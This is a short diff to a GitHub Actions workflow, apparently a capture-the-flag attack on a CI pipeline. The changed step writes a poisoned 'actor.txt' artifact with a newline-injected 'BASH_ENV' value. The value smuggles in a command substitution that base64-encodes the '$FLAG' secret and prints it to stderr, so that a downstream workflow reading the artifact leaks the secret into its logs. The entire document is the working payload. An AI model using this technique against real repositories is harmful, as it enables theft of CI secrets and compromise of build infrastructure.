@@ -6,7 +6,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          echo -e "me\nBASH_ENV='$(echo \$FLAG|base64|base64 1>&2)'" > actor.txt
+          echo -e "me\nBASH_ENV='\$(echo \$FLAG|base64|base64 1>&2)'" > actor.txt
       - uses: actions/upload-artifact@v7.0.2
         with:
           name: pr-metadata
